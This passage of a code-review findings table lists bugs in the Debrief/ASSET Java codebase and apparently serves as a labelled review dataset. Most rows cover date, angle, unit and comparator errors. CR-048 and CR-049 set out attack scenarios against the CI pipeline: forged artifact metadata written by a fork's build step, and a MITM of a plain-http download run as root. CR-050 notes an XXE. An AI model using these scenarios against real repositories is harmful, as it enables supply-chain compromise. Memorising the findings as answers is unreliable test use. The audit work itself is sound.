great-circle cross-track formula) and only accept the inline test after switching it away from CompletelyFlatEarth, which currently masks the error.",S,Requires knowing that WorldDistance.DEGS means degrees of arc along a great circle (as returned by rangeFrom) while the code mixes it with a Euclidean degree distance; the inline test passes because it forces CompletelyFlatEarth.,-,
CR-026,A5+A9,org.mwc.cmap.legacy,MWC.Utilities.TextFormatting,DebriefFormatDateTime,org.mwc.cmap.legacy/src/MWC/Utilities/TextFormatting/DebriefFormatDateTime.java,algorithm-correctness,time-handling,High,High,verified,Two-digit-year export/parse window and negative-epoch formatting corrupt DTGs,"toString/toStringHiRes emit yyMMdd (two-digit year) and parseThis parses two-digit years with SimpleDateFormat's default pivot (now-80y .. now+20y), so any DTG outside that moving window is silently rewritten on a write/read round trip and the result depends on the machine date. Verified by compiling: 1945-01-01 -> ""450101 000000"" -> 2045-01-01; 2050-01-01 -> ""500101 000000"" -> 1950-01-01. Separately, for pre-1970 instants theVal % 1000 > 0 and micros % 1000 > 0 are false for negative remainders and wholeSeconds truncates toward zero, so 1969-12-31 23:59:59.500 is written as ""700101 000000"" and ""691231 235959"" (millis dropped). || parseThis picks TWO_DIGIT_YEAR_FORMAT ('yyMMdd HHmmss') whenever the date token is 6 digits. SimpleDateFormat maps yy into the window [now-80y, now+20y] fixed when the static formatter was created. Verified on 2026-09-23: '450101' -> 2045 but '470101' -> 1947; in 2028 the same file's '470101' flips to 2047. Historical REP data from before 1946 is already mis-dated, and any file with dates more than 20 years ahead silently lands a century early; nothing warns the user.",L151-L153; L186-L187; L255-L259; L319-L337; L346-L379; L252-L259,Export a historical (WWII) or long-range planning track to .rep or to any XML attribute written via toStringHiRes and re-import it: all fixes move by 100 years.,"Write four-digit years (yyyyMMdd) everywhere and, when parsing yy, call set2DigitYearStart with a fixed epoch documented in the format spec; use Math.floorMod/floorDiv for the sub-second arithmetic.",M,Needs knowledge of SimpleDateFormat's date-dependent two-digit-year pivot and of Java's sign-preserving % operator; the code reads as correct.,Debrief.ReaderWriter.Replay export,
CR-027,A6,org.mwc.debrief.legacy,Debrief.Wrappers,SensorContactWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/SensorContactWrapper.java,bug,silent-data-loss,High,High,verified,compareTo returns 1 for equal-time cuts; TreeSet remove silently fails,"compareTo() returns 1 whenever DTGs are equal and the object is not the same instance (and when _DTG is null). This violates the Comparable contract, so once the TreeSet rebalances, TreeSet.remove()/contains() navigate past equal-time siblings and fail (verified: 4 equal-time items, remove of the first returns false while the item remains in the set). TacticalDataWrapper.removeElement ignores the boolean result, so deleting such a cut silently does nothing while the UI reports success. Same pattern in TMAContactWrapper L573-L599 and DynamicTrackShapes.DynamicTrackShapeWrapper L199-L225.",L736-L762; TacticalDataWrapper L828,"REP/DPF sensor with three or more cuts sharing one DTG (e.g. multi-target sonar at the same second), then delete one of them from the Outline view","Break ties deterministically (e.g. by identityHashCode or an insertion sequence number stored in the cut) so compareTo is antisymmetric and transitive, or switch the container to a list keyed by time.",M,Requires understanding red-black tree navigation with a non-antisymmetric comparator; the code comments assert the opposite of what happens.,TMAContactWrapper L573-L599; DynamicTrackShapeWrapper L199-L225,
CR-028,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TMAWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TMAWrapper.java,algorithm-correctness,angle-wrap,High,High,verified,createItem interpolates radians against a 180-degree wrap threshold,"TMAContactWrapper.getCourse()/getBearingRads() return radians, but LinearInterpolator.interp's wrap check compares the difference with 180, so a course change from 350 to 10 degrees is interpolated the long way (midpoint 180 degrees, verified) and then converted with Rads2Degs. Resampled TMA solutions get wrong target course and wrong bearing for range/bearing-defined solutions.",L505; L529,"TMA solution whose consecutive entries have courses 350 and 010 (or bearings either side of north), then 'Resample data at' on the TMA layer",Interpolate in degrees (_targetCourseDegs) or convert to degrees before calling interp; add a unit test crossing north.,S,Needs the unit of getCourse() on TMAContactWrapper and the threshold inside a helper in another class; not grep-able.,-,
CR-029,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TacticalDataWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TacticalDataWrapper.java,algorithm-correctness,angle-wrap,High,High,verified,"LinearInterpolator applies 360-degree wrap to range, frequency and depth","LinearInterpolator.interp() unconditionally treats any pair whose difference exceeds 180 as an angle and subtracts 360 from values above 180. It is used by SensorWrapper.createItem for range (yards/metres) and frequency (Hz) and by TMAWrapper.createItem for depth, speed, minima/maxima, so resampling sensor or TMA data with ranges like 100->5000 yds or frequencies like 150->400 Hz produces silently wrong interpolated values (verified: 100..5000 midpoint = 2370 instead of 2550). Also _timeDelta==0 (two cuts at the same DTG, which compareTo allows) gives an Infinity gradient.",L119; L125-L140; SensorWrapper L1052; SensorWrapper L1060-L1064; TMAWrapper L507,"Sensor with ranged cuts (e.g. 100 yds then 5000 yds) or frequency data spanning >180 Hz, then set 'Resample data at' on the sensor",Add a separate interpAngle() for bearings/orientation and keep interp() purely linear; guard _timeDelta==0.,S,Only visible by reading which quantities the shared interpolator is applied to; each call site looks correct in isolation.,-,
CR-030,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,algorithm-correctness,unit-mismatch,High,High,verified,decimateRelativeTMA passes millis to HiResDate micros constructor,"decimateRelativeTMA receives theStartTime in milliseconds (startMicros = theStartTime*1000L at L751 confirms this) but then constructs new HiResDate(0, theStartTime), whose second argument is microseconds, so startDTG is 1000x too early (1970-era). The RelativeTMASegment offset recomputation via interpolateFix/getNearestTo therefore uses a bogus time, and the leg is renamed with a 1970 DTG via sortOutDateLabel. Reached from TrackWrapper.setResampleDataAt -> seg.decimate -> decimateRelative for CoreTMASegment legs.",L751; L760; L779,"Track whose first leg is a RelativeTMASegment, set 'Resample data at' on the parent track in the Properties view",Use new HiResDate(theStartTime) (millis constructor) or pass startMicros; add a unit test for resampling a relative TMA leg that checks the leg name/offset.,S,"Requires tracing the millis/micros convention of theStartTime across three methods and knowing the HiResDate(long,long) signature.",-,
CR-031,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,bug,silent-data-loss,High,High,verified,Equal-start segments silently dropped by SegmentList (compareTo by startDTG),"TrackSegment.compareTo orders solely by startDTG(), and SegmentList (a ConcurrentSkipListSet via Plottables) ignores the boolean from add(), so a second segment whose first fix has the same DTG as an existing segment is silently discarded (verified with ConcurrentSkipListSet: second add returns false). startDTG() is also a mutable key: adding an earlier fix to a segment already in the set (TrackWrapper.addFix always appends to last()) or trimTo() can reorder keys without re-sorting, after which removeElement/first()/last() may target the wrong segment.",L634-L661; TrackWrapper_Support L288-L305; TrackWrapper L1056,"Generate a second TMA leg from cuts starting at the same DTG as an existing leg, or group/merge two tracks whose legs start at the same second",Check the result of super.add() in SegmentList.addSegment and either reject with a message or break ties (name/identity); remove and re-add a segment whenever its start time changes.,M,"Requires linking the comparator, the skip-list container semantics in Plottables and the mutable-key mutation paths.",-,
CR-032,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TrackWrapper.java,algorithm-correctness,division-by-zero,High,High,verified,calcCourseSpeed sub-second gaps give Infinity; setResampleDataAt divides by 0,"calcCourseSpeed() computes timeDifference as (micros delta)/1000000 in long arithmetic, so any gap under 1 s becomes 0 and distance/0 yields Infinity (or NaN) which is written into every fix via setSpeed; gaps of 1.9 s are treated as 1 s, inflating speed by up to 2x. 'Calc Course & Speed' is a top-level track menu action, so the wrong speeds are silently persisted and feed TMA/DR reconstruction. Separately, setResampleDataAt computes currentStart / interval (L3360) before the <=0 guard (L3371); the TimeFrequencyPropertyEditor 'None' tag is 0 micros, so selecting it throws ArithmeticException (SensorWrapper.setResampleDataAt guards this correctly); the same method also passes a millis startTime (L3366) to TacticalDataWrapper.decimate which expects micros (harmless only because max() discards it).",L1209; L1212; L3357-L3371; L3366; L3390-L3395,"Track with 1 Hz-or-faster fixes (e.g. NMEA/AIS at 0.5 s, or jittered 0.9 s), then Track > Calc Course & Speed; or select 'None' in the track's 'Resample data at' property","Compute the delta as a double in seconds (micros/1e6d), skip or merge fixes with zero delta, and guard against non-finite results before setSpeed; move the <=0 interval check above the division and pass micros to decimate.",S,Needs reasoning about integer vs floating division and the microsecond units of HiResDate; a grep for '/ 1000000' cannot tell which divisions are integer.,-,
CR-033,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,AmbiguityResolver,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/AmbiguityResolver.java,algorithm-correctness,angle-wrap,High,High,verified,Domain fold subtracts 180 instead of 360; PermScore folds only once,"In sliceSensorIntoLegsUsingAmbiguity the ambiguous-minus-core delta step is folded with 'valueDelta -= 180d' for the >180 case but '+= 360d' for the <-180 case. A 360-domain jump of +350 becomes +170 instead of -10, giving a huge gapRate that exceeds minZig and falsely ends the current leg / starts a zig (python: 350->170, correct -10; 190->10, correct -170). Separately PermScore (L135-L140) folds the difference of two unwrapped curve values only once, so differences beyond +/-540 are mis-scored.",L1213-L1217; L135-L140,"Towed-array cut pair on a steady leg where (ambig-core) delta moves from -175 to +178 (domain flip) while thisLeg != null: valueDelta=353 -> 173 deg, gapRate>0.5 deg/s -> spurious zig.",Use 'valueDelta -= 360d' (or a shared shortAngle() helper) and make PermScore fold with a while loop or ((x+180)%360+360)%360-180.,S,Only visible by checking the two branches of the fold are symmetric and by reasoning about the unwrapped-domain range of curve outputs.,-,
CR-034,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,AlternateLegWrapper,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/AlternateLegWrapper.java,algorithm-correctness,angle-wrap,High,High,verified,"Course unwrap typo: 'heading - heading > 180' never true, so northerly crossi...","collateData() is meant to unwrap ownship courses across 0/360 before the steady-course statistics run, but the second branch compares heading with itself (always 0) instead of with previousHeading. Only the 359->1 direction is unwrapped; a 1->359 step is left as a 358 degree jump, so max-min range, stdev and regression tests in SCAlgorithms all fail and the steady-heading interval is broken or never detected. This is the production ownship leg slicer (StackedDotHelper.sliceOwnship uses AlternateLegWrapper whenever the course data is not artificial).",L58-L61,"Ownship track steering ~000 with normal jitter, e.g. courses 002, 358, 001, 359 (python check: [5,355,5,350] -> [5,355,365,350], first step left as 350 jump)",Change the second condition to 'heading - previousHeading > 180.0'; add a unit test with courses oscillating either side of north and assert a single steady leg.,S,Needs reading the intent of the two-branch unwrap to notice the self-comparison; a linter might flag x-x but not the algorithmic consequence.,-,
CR-035,A8,org.mwc.asset.legacy,ASSET.Models.Movement,TurnAlgorithm,org.mwc.asset.legacy/src/ASSET/Models/Movement/TurnAlgorithm.java,algorithm-correctness,logic-error,High,High,candidate,doTurn() computes height delta from stale demHeight field of previous partici...,"doTurn (climb-rate branch) computes 'heightDelta = demHeight - (-depth)' at L1039 using the instance field demHeight, which is only assigned inside doTurn2 (L1132) during the previous call. Because CoreMovement holds one static TurnAlgorithm shared by all participants (CoreMovement L214), demHeight belongs to whichever participant moved last. The climb/dive phase (L1048-L1077) is therefore triggered with the wrong magnitude and sign, so helicopter/aircraft height changes are mis-timed and the default climb/dive speed is applied for the wrong duration.",L1039; L1048-L1077; CoreMovement L214,"Two helos: A at 100 m demanded 100 m, B at 0 m demanded 400 m, stepped alternately; A's doTurn sees demHeight=400 from B's previous doTurn2 and enters the climb branch although its own demanded height equals its current height.","Use demStatus.getHeight() (clamped as in doTurn2) at L1039, and make TurnAlgorithm state local to doTurn2 (or one instance per participant) instead of a static shared instance.",S,Requires tracking which field is written where and the static sharing of the object across participants.,-,
CR-036,A8,org.mwc.asset.legacy,ASSET.Util,IdNumber,org.mwc.asset.legacy/src/ASSET/Util/IdNumber.java,algorithm-correctness,nondeterminism,High,High,candidate,Participant ids from unseeded java.util.Random make runs non-reproducible and...,"generateInt uses a static 'new java.util.Random()' (L24) with no seed, independent of RandomGenerator.seed(). Ids are keys of CoreScenario's HashMaps (CoreScenario L495-L505) whose iteration order drives the order in which participants decide, move and detect (CoreScenario L1394-L1423) and therefore the order in which RandomGenerator draws are consumed. Even with a RandomSeed in the control file, two runs of the same scenario can produce different outcomes. Ids are drawn from only 1,000,000 values; a collision silently replaces the earlier participant (CoreScenario L707-L711 only prints 'DUPLICATE ENTITY').",L24-L34; CoreScenario L695-L711,Run the same Monte-Carlo scenario twice with RandomSeed=42 and participants created through createNewParticipant/ParticipantVariance; per-run detection times differ.,Draw ids from RandomGenerator (seeded) or a monotonically increasing counter; make CoreScenario reject duplicate ids or use LinkedHashMap to fix stepping order.,S,Requires tracing how ids affect HashMap order and downstream RNG consumption.,-,
CR-037,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,MultiScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/MultiScenarioGenerator.java,bug,degenerate-input,High,High,candidate,createNewRandomisedPermutations loops forever when MaxPerms cannot be satisfied,"The generation loop 'while (counter < _numPerms)' (L637) rejects permutations whose hash already appears MaxPerms times, but the only escape check 'attempts > 2 * _numPerms' merely prints a message (L696-L698) and never breaks. A control file whose variance space has fewer than Number/MaxPerms distinct combinations hangs the generator (and the GUI/command-line runner) indefinitely. Same code duplicated in createNewRandomisedPermutationsOld (L731, L790).",L637-L700; L731-L794,"Control file with a single Choice of 2 values, Number=3, MaxPerms=1.",Break out of the loop (and return an error) when attempts exceed the limit.,S,"grep-able once you know to look, but recognising the missing break needs reading.",-,
CR-038,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ParticipantVariance,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ParticipantVariance.java,algorithm-correctness,nondeterminism,High,High,candidate,"Random course and random location use Math.random(), bypassing the seeded Ran...","applyRandomCourse sets Course = Math.random()*360 (L290) and applyDistributionArea calls WorldArea.getRandomLocation() (L244), which itself uses Math.random() (MWC/GenericData/WorldArea.java L717-L719). ScenarioGenerator.doScenarioGeneration seeds only RandomGenerator (ScenarioGenerator L893-L895), so generated scenario sets are not reproducible from the RandomSeed attribute. Also 'isMonte == """"' (L346) is a string reference comparison.",L244; L290; L346,Control file with RandomSeed=7 and a ParticipantVariance with RandomCourse=true or inRandomLocations=true; regenerate twice and diff the output scenario files.,Use RandomGenerator.nextRandom() for course and add a seeded variant of WorldArea.getRandomLocation (or generate lat/long here with RandomGenerator); use isEmpty().,S,Requires knowing which RNG the seed applies to; grep for Math.random finds candidates but not the seed linkage.,-,
CR-039,A9,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,algorithm-correctness,locale-parsing,High,High,verified,readThisDouble silently truncates comma-decimal and garbage-suffixed numbers,"readThisDouble parses with a Locale.UK DecimalFormat first and only falls back to the comma (FRANCE) format on ParseException. DecimalFormat.parse is a prefix parser: it never throws for '22,5', '12.5abc', '1e5' or '22 10', so the comma fallback is unreachable and the value is silently truncated (verified with JDK 21: '22,5'->22.0, '239,9'->239.0, '1e5'->1.0, '12.5abc'->12.5). Every REP line importer (ImportFix lat/lon/course/depth, sensors, TMA, shapes) relies on this helper, so a European-formatted REP file yields wrong positions/courses with no error.",L153-L163; L222-L241,"REP fix line '951212 051600 NELSON @C 22 10 53,54 N 21 45 14,20 W 239,9 2.0 0' (comma decimals) imports as 53 s / 14 s / 239 deg with no warning","Parse with ParsePosition and require pos.getIndex()==trimmed.length(); if the UK parse does not consume the whole token, try the comma format, else throw ParseException. Alternatively use Double.parseDouble after normalising the decimal separator.",S,Requires knowing DecimalFormat.parse prefix semantics and tracing that the comma fallback branch is dead; not grep-able.,-,
CR-040,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Antares,ImportAntaresImpl,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Antares/ImportAntaresImpl.java,algorithm-correctness,unit-mismatch,High,High,candidate,Antares course (degrees) and speed (knots) stored raw as Fix radians / yards-...,"loadThisLine parses course, speed and depth with Double.parseDouble and passes course and speed straight into new Fix(date, location, course, speed). Fix stores course in radians and speed in yards/sec (every other importer converts, e.g. ImportFix L846-847 Degs2Rads/Kts2Yps). A course of 30 in the file becomes 30 rad (=1718 deg mod 360 = 278 deg) and 2 kts becomes 2 yps (=3.55 kts). ImportAntaresTest L72-74 asserts fixWrapper.getCourse()==30 and getFix().getSpeed()==2, enshrining the wrong units.",L156-L171,'TRACK/010530Z/2512.0N-03010.5W/30/2/-5//' imports with course 278.3 deg and speed 3.55 kts,"Convert: Conversions.Degs2Rads(course) and Conversions.Kts2Yps(speed) (confirm file units with the format spec), and fix the unit test expectations.",S,Requires knowing the Fix constructor's unit contract; the code compiles and tests pass.,-,
CR-041,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.FlatFile,NMEA_Radar_FileImporter,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/FlatFile/NMEA_Radar_FileImporter.java,bug,time-handling,High,High,verified,"Radar log timestamps parsed with 12-hour 'hh': PM records dropped, noon recor...","getDate builds a non-lenient GMTDateFormat('yyMMdd_hhmmss'); 'hh' is the 1-12 clock-hour field. Verified on JDK 21: '700101_130601' and '700101_000601' throw ParseException (readLine returns Optional.empty and the record is silently dropped, only System.out), while '700101_120601' parses as 00:06:01, i.e. noon records are placed 12 hours early. Any $RATTM log covering 12:00-23:59 or 00:00-00:59 loses or misplaces contacts.",L330-L333; L351; L364-L367,"Radar log line '700101_130601:$RATTM,002,0.665,224.7,T,0.17,31.2,R,0.16,99.99,N,,T,,,A*2A' is rejected; '700101_120601:...' is stored at 00:06:01",Use pattern 'yyMMdd_HHmmss'. Also report skipped lines through the ErrorLogger instead of System.out.,S,Requires knowing SimpleDateFormat hh vs HH semantics with lenient=false; a regex grep would not flag it.,-,
CR-042,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Nisida,ImportNisida,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Nisida/ImportNisida.java,bug,locale-parsing,High,High,verified,UNIT month parsed with default-locale SimpleDateFormat('MMMyy'); non-English ...,"importThis creates new SimpleDateFormat('MMMyy') with the platform default locale (also default time zone). Verified: with Locale.GERMANY 'MAR20' and 'OCT20' throw ParseException. processUnit then only appends an error and leaves status.year/month at 0, and parseTimestamp (L362-366) builds every subsequent timestamp from year 0 / month 0, so all fixes, contacts and narratives get bogus dates while the import 'succeeds'. Separately, timestamps carry day-of-month only, so a report spanning a month boundary rolls back a month (L365).",L253; L801-L812; L362-L366,NISIDA file starting 'UNIT/ADRI/OCT20/...' opened on a JVM with a German or French default locale,"Use new SimpleDateFormat('MMMyy', Locale.ENGLISH) with GMT time zone, and abort (or refuse to create fixes) when the UNIT date failed to parse.",S,"Locale-default SimpleDateFormat is grep-able, but the year-0 silent consequence needs the state flow.",-,
CR-043,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportNarrative,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportNarrative.java,bug,silent-data-loss,High,High,candidate,Exported ;NARRATIVE: lines omit the track name (return value of exportTrackNa...,"exportThis calls ImportFix.exportTrackName(theEntry.getTrackName(), line) but ignores its return value, so the written line is ';NARRATIVE: <dtg> <entry text>' with no track column. On re-import readThisLine (L289-292) consumes the first word of the entry text as the track name, so every exported narrative loses its source track and the first word of its text. ImportNarrative2 (L358) does it correctly.",L237-L252,Export a narrative layer to REP (clipboard) and re-import: entry 'Contact regained' on track NELSON becomes track 'Contact' with text 'regained',"Assign the result: line = ImportFix.exportTrackName(theEntry.getTrackName(), line);",S,"Discarded-return-value on a String-building helper; CodeQL might flag unused return value, but the data-loss consequence needs the reader side.",-,
CR-044,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportReplay,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportReplay.java,bug,silent-data-loss,High,High,candidate,"Malformed REP lines are silently dropped: line importers return null, readLin...","Most per-line importers catch ParseException, write to Trace and return null (ImportFix L881-884, ImportSensor L350-353, ImportSensor2 L338-341, ImportTMA_Pos L371-374, ImportTMA_RngBrg L341-344, ImportCircle L237-240, ImportRectangle L298-301, ImportLabel L233-236, ImportPolygon L540-543, ImportWheel L249-252, ImportBearing L263-266). ImportReplay.readLine then falls through every instanceof branch for a null object and returns null, so a fix/sensor/TMA line with an unparseable numeric field vanishes from the imported track with no dialog, no line number and no count; the user sees a track with silently missing fixes. Only NumberFormat/NoSuchElement/Parse exceptions that escape the line importer reach the readError dialog (L1618-L1630), giving inconsistent behaviour between fields (e.g. speed uses Double.valueOf and aborts, latitude uses readThisDouble and is dropped).",L2203-L2217; L2222-L2349; L1618-L1630,"REP file with one fix line whose latitude seconds field is 'x' among 1000 good lines: import completes, one fix missing, no error shown",Make readLine treat a null result from a recognised importer as an error: count it and surface the line number via readError/handleException (or collect a summary of skipped lines shown at end of import).,M,Needs tracing the null-return contract across ~12 importer classes and the readLine dispatch; grep finds 'return null' but not that the caller drops it silently.,-,
CR-045,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.ais,AISParser,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/ais/AISParser.java,bug,null-deref,High,High,candidate,"AISParser.parse returns raw null for out-of-sequence multipart fragment, NPE ...","parse() returns Optional<IAISMessage> everywhere except L228, where an out-of-order or orphan multi-sentence fragment returns bare null. ImportAIS.importThis calls oRes.isPresent() on the result (ImportAIS L305-306) and throws NullPointerException, aborting the whole import. AIS logs very commonly start mid-message or drop fragments, so this is triggered by ordinary capture files.",L225-L229; L192-L259,"AIS log whose first line is a second fragment, e.g. '!AIVDM,2,2,3,B,88888888880,2*25' (valid checksum) followed by normal position reports",Return Optional.empty() at L228 and log the discarded fragment with the line number.,S,"grep-able (return null in Optional-returning method), but the crash needs the caller's isPresent() call to be linked.",-,
CR-046,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,InterpolateTrack,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/InterpolateTrack.java,bug,silent-data-loss,High,High,candidate,Resample replaces all original fixes and Undo leaves the track empty,"execute() resamples from start+interval to <end (so the original first and last fixes are never regenerated), then clearPositions() discards every original fix and adds only the interpolated ones; original positions are never remembered. undo() removes only the interpolated fixes and sets _newFixes to null, so after Undo the track has no positions at all, and a second undo would NPE on _newFixes.",L84-L85; L90-L91; L113-L119; L134-L141,"Outline right-click on any TrackWrapper -> Resample position data -> 1 Min, then Edit -> Undo",Snapshot the original FixWrapper collection (per segment) before clearPositions() and restore it in undo(); also keep the original start/end fixes or extend the loop to <= endTime.,M,Needs reasoning about what undo must restore versus what execute discarded; not a pattern a linter flags.,-,
CR-047,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,SplitTracksIntoLegs,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/SplitTracksIntoLegs.java,bug,degenerate-input,High,High,candidate,Undo of split throws IndexOutOfBounds when any selected track had no jumps,"execute() stores newSegments for every track including empty lists (L92-L94, L190-L192). undo() takes splits.get(0) as the merge target without checking emptiness, so an empty list throws IndexOutOfBoundsException and the remaining tracks are never restored; the undo operation is left half-applied in the history.",L92-L94; L113-L116; L190-L192; L211-L214,"Select two tracks, one with a >1 minute gap and one continuous; Split tracks into segments on gaps over 1 Minute; then Undo",Skip tracks whose split list is empty (or do not store them) in both SplitTracksOperation.undo and SpatialSplitTracksOperation.undo.,S,Requires connecting execute's storage of empty lists to undo's unconditional get(0).,-,
CR-048,A11,.github,-,pr-build-comment.yml,.github/workflows/pr-build-comment.yml,security,logic-error,High,High,candidate,pr-meta validation lets a fork PR steer the write-token comment onto any PR,"Real type: insufficient validation of untrusted workflow_run artifact. The job runs with `pull-requests: write` (L24) and reads pr-meta/meta.env (L69-77), which is produced in main.yml AFTER `mvn clean verify` executed the fork's poms on the same runner (main.yml L174-179 then L282-290), so every byte of it is attacker-controlled. The only guard on `pr` is `Number.isInteger(prNumber) && prNumber > 0` (L79-83); nothing ties it to the run (`github.event.workflow_run`). The sticky-comment logic (L177-187) then updates the existing github-actions[bot] comment containing MARKER on that issue, so an attacker replaces a legitimate PR's 'Review builds' comment with links to binaries built from their own fork. `meta.build` (L91-96) is equally untrusted, so a failed build can be presented as `success`.",L24; L56-83; L91-96; L177-187,"Fork PR whose pom.xml antrun execution runs `printf 'pr=123\nsha=<40hex>\nbuild=success\n' > $GITHUB_WORKSPACE/pr-meta/meta.env` after the real step, or simply replaces /usr/bin/bash via passwordless sudo; the comment on PR #123 is rewritten to point at the attacker's Windows zip.","Do not trust `pr` from the artifact: resolve the PR via `github.rest.pulls.list({head: run.head_repository.full_name+':'+run.head_branch})` (or `repos.listPullRequestsAssociatedWithCommit(run.head_sha)`) and require `pull.head.sha === run.head_sha`; derive `built` from `run.conclusion`, not meta.build.",S,Requires following the data flow from the untrusted build step through the artifact into the privileged workflow and noticing the integer check does not bind the number to the run; no grep/CodeQL rule expresses this.,-,
CR-049,A11,root,-,install-msitools.sh,install-msitools.sh,supply-chain,ssrf-or-unvalidated-url,High,High,candidate,Release job downloads msitools over plain http and runs sudo make install,"L3 fetches http://ftp.gnome.org/pub/GNOME/sources/msitools/0.100/msitools-0.100.tar.xz with no TLS and no checksum/signature check, L5 compiles it and installs as root. It runs only in main.yml's `build installer` step (L196-215) on tag builds, i.e. on the very runner that holds the `contents: write` GITHUB_TOKEN (L88-89) and later uploads the release (L310-324). A network MITM of the cleartext fetch gets root on the release runner and can replace every release asset. ftp.gnome.org is also decommissioned (redirects to download.gnome.org), so the fetch depends on a redirect from an unauthenticated origin.",L3-5; .github/workflows/main.yml L196-215,Push a release-shaped tag while an on-path attacker answers the http GET for msitools-0.100.tar.xz with a tarball whose Makefile installs a trojaned wixl.,"Use https://download.gnome.org/... , pin the tarball SHA-256 and check it with sha256sum -c before extracting, or install the distro `msitools`/`wixl` package (available in Ubuntu 24.04) instead of compiling.",S,"grep-able for http://, but ranking it needed the workflow read to see it runs on the release runner with the write token.",-,
CR-050,A1,org.mwc.asset.ScenarioController2,org.mwc.asset.scenariocontroller2,CoreControllerPresenter,org.mwc.asset.ScenarioController2/src/org/mwc/asset/scenariocontroller2/CoreControllerPresenter.java,security,xxe,Medium,High,candidate,Dropped file sniffed with unhardened DocumentBuilder and parsed as a URI,"getFirstNodeName() fully parses any file dropped onto the scenario controller with a default DocumentBuilderFactory (entities and DTDs enabled) just to read the root element name; it also passes the raw path to builder.parse(String), which treats it as a URI, so paths containing '#' or '%' fail. SAXException is not caught and propagates as Exception.",L124-L140,Drop a control file containing a DOCTYPE with an external entity onto the Scenario Controller view,"Harden the factory (secure processing, disallow-doctype-decl) and parse via new File(path) or a FileInputStream; consider a streaming StAX peek that stops at the first START_ELEMENT.",S,grep-able,CWE-611,
CR-051,A1,org.mwc.asset.ScenarioController2,org.mwc.asset.scenariocontroller2,MultiScenarioPresenter,org.mwc.asset.ScenarioController2/src/org/mwc/asset/scenariocontroller2/MultiScenarioPresenter.java,bug,null-deref,Medium,High,candidate,Control-file load failure leaves _scenarioController null and is then derefer...,"importThisControlFile() failures are caught and logged but execution continues to _scenarioController.observerList and isRelativePath(tgtDir), so a malformed control file produces an NPE in the UI thread rather than an error message; importThisControlFile also returns null when the file has no ScenarioController element, and outputDirectory is null when the attribute is absent (NPE in isRelativePath at thePath.length()). The controlType dispatch at L534-L535 compares Strings with == and relies on interning.",L526-L558,"Drop an .xml control file with a syntax error, or one lacking OutputDirectory, onto the Multi Scenario view",Return after logging when import fails or the container/directory is null; use equals() for the type comparison.,S,Needs following the caught-exception path into the following statements.,CoreControllerPresenter L148-L170,
CR-052,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,bug,locale-parsing,Medium,High,candidate,Generated XML re-encoded through the platform default charset,"writeToString() serialises with a Transformer (UTF-8 output by default) into a ByteArrayOutputStream and then calls bos.toString() (platform charset); writeTheseToFile() writes the resulting String with FileWriter (platform charset again). On a non-UTF-8 default locale any non-ASCII text in the scenario is corrupted while the file still declares encoding=""UTF-8"", so the generated scenarios fail to parse or contain mojibake.",L539-L562; L564-L587; L1000-L1003; L1041-L1049,"Template with participant name containing an accented character, generated on a Windows cp1252 machine",Use bos.toString(StandardCharsets.UTF_8) and write with an OutputStreamWriter in UTF-8 (or stream the Transformer directly to the file).,S,grep-able,SupportTesting L170-L192 same pattern,
CR-053,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,bug,null-deref,Medium,High,candidate,readDocumentFrom returns null on parse failure; callers dereference it,"readDocumentFrom(InputSource) catches SAXException/IOException, prints the stack trace and returns null; readDocumentFrom(InputStream) does the same for IOException. validateThisDocument() then calls getIt.getNodeType() on the null (NPE instead of the intended error string) and contains the no-op 'scrapNodeType = scrapNodeType++'. Other callers of readDocumentFrom in the Monte Carlo code receive null documents on malformed input.",L477-L490; L495-L506; L515-L533,Run scenario generation with a scenario template that is not well-formed XML,Let the exceptions propagate (or wrap them in a checked ImportException) and remove the dead scrapNodeType code.,S,grep-able,-,
